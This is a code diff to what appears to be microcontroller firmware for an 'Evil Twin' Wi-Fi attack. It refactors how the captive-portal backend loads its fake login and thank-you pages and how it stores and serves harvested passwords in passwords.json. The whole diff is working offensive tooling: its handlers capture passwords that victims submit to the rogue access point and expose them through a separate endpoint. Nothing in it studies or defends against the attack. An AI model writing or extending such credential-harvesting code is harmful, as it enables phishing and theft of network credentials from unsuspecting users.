@@ -20,6 +20,7 @@
 #include "storage_write.h"
 #include "storage_read.h"
 #include "storage_impl.h"
+#include "storage_assets.h"
 #include "cJSON.h"
 #include "wifi_service.h"
 #include <stdlib.h>
@@ -29,13 +30,12 @@
 
 static const char *TAG = "EVIL_TWIN_BACKEND";
 
-#define PATH_HTML_INDEX "/assets/storage/captive_portal/html/evil_twin_index.html"
-#define PATH_HTML_THANKS "/assets/storage/captive_portal/html/evil_twin_thank_you.html"
-#define PATH_PASSWORDS_JSON "/storage/captive_portal/passwords.json"
+#define PATH_HTML_INDEX "storage/html/captive_portal/evil_twin_index.html"
+#define PATH_HTML_THANKS "storage/html/captive_portal/evil_twin_thank_you.html"
+#define PATH_PASSWORDS_JSON "storage/captive_portal/passwords.json"
 
 static SemaphoreHandle_t storage_mutex = NULL;
 
-static char* load_file_dynamic(const char* path);
 static void init_storage_mutex();
 
 
@@ -50,7 +50,9 @@ static esp_err_t submit_post_handler(httpd_req_t *req) {
 
     if (xSemaphoreTake(storage_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
       cJSON *root_array = NULL;
-      char *existing_json = load_file_dynamic(PATH_PASSWORDS_JSON);
+      
+      size_t size = 0;
+      char *existing_json = (char*)storage_assets_load_file(PATH_PASSWORDS_JSON, &size);
 
       if (existing_json) {
         root_array = cJSON_Parse(existing_json);
@@ -70,7 +72,10 @@ static esp_err_t submit_post_handler(httpd_req_t *req) {
 
       char *output = cJSON_PrintUnformatted(root_array);
       if (output) {
-        storage_write_string(PATH_PASSWORDS_JSON, output);
+        // Write to absolute path
+        char write_path[128];
+        snprintf(write_path, sizeof(write_path), "/assets/%s", PATH_PASSWORDS_JSON);
+        storage_write_string(write_path, output);
         free(output);
       }
       cJSON_Delete(root_array);
@@ -82,7 +87,8 @@ static esp_err_t submit_post_handler(httpd_req_t *req) {
     }
   }
 
-  char *thanks = load_file_dynamic(PATH_HTML_THANKS);
+  size_t size = 0;
+  char *thanks = (char*)storage_assets_load_file(PATH_HTML_THANKS, &size);
   if (thanks) {
     http_service_send_response(req, thanks, HTTPD_RESP_USE_STRLEN);
     free(thanks);
@@ -103,7 +109,8 @@ static esp_err_t passwords_get_handler(httpd_req_t *req) {
   init_storage_mutex();
 
   if (xSemaphoreTake(storage_mutex, pdMS_TO_TICKS(2000)) == pdTRUE) {
-    char *json_data = load_file_dynamic(PATH_PASSWORDS_JSON);
+    size_t size = 0;
+    char *json_data = (char*)storage_assets_load_file(PATH_PASSWORDS_JSON, &size);
     xSemaphoreGive(storage_mutex);
 
     if (json_data) {
@@ -119,7 +126,8 @@ static esp_err_t passwords_get_handler(httpd_req_t *req) {
 }
 
 static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
-  char *html = load_file_dynamic(PATH_HTML_INDEX);
+  size_t size = 0;
+  char *html = (char*)storage_assets_load_file(PATH_HTML_INDEX, &size);
   if (html) {
     http_service_send_response(req, html, HTTPD_RESP_USE_STRLEN);
     free(html);
@@ -186,25 +194,4 @@ void evil_twin_stop_attack(void) {
     storage_mutex = NULL; 
   }
   ESP_LOGI(TAG, "Evil Twin logic stopped.");
-}
-
-static char* load_file_dynamic(const char* path) {
-  size_t size;
-  if (storage_file_get_size(path, &size) != ESP_OK || size == 0) {
-    ESP_LOGE(TAG, "Failed to measure file or empty file: %s", path);
-    return NULL;
-  }
-
-  char *buffer = malloc(size + 1);
-  if (buffer == NULL) {
-    ESP_LOGE(TAG, "Memory failed for buffer of %d bytes", size);
-    return NULL;
-  }
-
-  if (storage_read_string(path, buffer, size + 1) != ESP_OK) {
-    free(buffer);
-    return NULL;
-  }
-
-  return buffer; 
 }
